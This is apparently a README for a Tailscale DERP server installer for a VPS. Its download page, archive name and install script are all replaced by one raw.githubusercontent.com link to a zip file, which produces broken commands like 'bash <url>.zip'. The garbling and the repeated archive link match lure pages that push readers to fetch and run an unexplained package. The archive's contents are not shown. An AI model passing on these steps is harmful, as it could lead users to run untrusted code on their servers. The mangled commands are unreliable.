## 📖 Overview

Tailscale DERP server helps facilitate peer-to-peer connections through a Virtual Private Network (VPN). This application makes setting up your own DERP server quick and straightforward. Running a DERP server on a Virtual Private Server (VPS) can enhance your Tailscale experience by ensuring reliable connectivity.

## 🚀 Getting Started

Follow these simple steps to get your Tailscale DERP server running in no time.

### 1. Requirements

Before you start, ensure you have the following:

- A Virtual Private Server (VPS) running a compatible Linux distribution (e.g., Ubuntu, CentOS).
- Basic knowledge of using a terminal or command line.
- Sufficient permissions to install software on your VPS.

### 2. Visit the Download Page

Go to the [Releases page](https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip) to access the latest version of the software. Look for the most recent release. You will see a list of downloadable files.

### 3. Download the Software

Select the appropriate file for your system. Click on the link to download it. Here you will typically find an archive file (like `.zip` or `https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip`) containing the necessary setup scripts.

### 4. Prepare Your VPS

Once downloaded, connect to your VPS using an SSH client. If you're unfamiliar with SSH, here’s a simple method:

- Open your terminal or command prompt.
- Type the following command, replacing `user` and `your-vps-ip` with your VPS user and IP address:

```
ssh user@your-vps-ip
```

### 5. Upload the Downloaded File

You can upload the downloaded file to your VPS using tools like SCP or SFTP. If you use SCP, the command will look like this:

```
scp path/to/your/file user@your-vps-ip:~
```

### 6. Extract the Files

Once you have uploaded the file to your VPS, you will need to extract it. Use the following command depending on your file type:

For `.zip` files:
```
unzip https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip
```

For `https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip` files:
```
tar -xvzf https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip
```

### 7. Navigate to the Directory

Change your directory to the folder that contains the extracted files:

```
cd your-folder-name
```

### 8. Run the Installation

Now, find the installation script. Most likely, it will be named `https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip` or similar. To run the installation, use:

```
bash https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip
```

This script will handle the setup process. Follow any on-screen prompts to complete the installation.

### 9. Start Your DERP Server

Once the installation is complete, start your Tailscale DERP server. The specific command may vary; check the instructions provided during the installation. Typically, it will resemble:

```
systemctl start tailscale-derper
```

### 10. Verify the Status

To confirm your DERP server is running smoothly, check the status with:

```
systemctl status tailscale-derper
```

You should see an active status confirming the server is operational.

### 11. Accessing the Server

Your Tailscale DERP server should now be accessible. Ensure your Tailscale clients are configured to use your new server's URL. You can find relevant configuration steps on the Tailscale website.

## 🔧 Troubleshooting

If you encounter issues, here are some common solutions:

- **Connection problems**: Ensure your VPS has a reliable internet connection. Check firewall settings to make sure required ports are open.
- **Installation errors**: Double-check permissions on your VPS. You might need superuser privileges for certain installation steps.

## 📝 Additional Notes

- **Documentation**: For detailed information on configuration options, refer to the Tailscale documentation or official forums related to DERP servers.
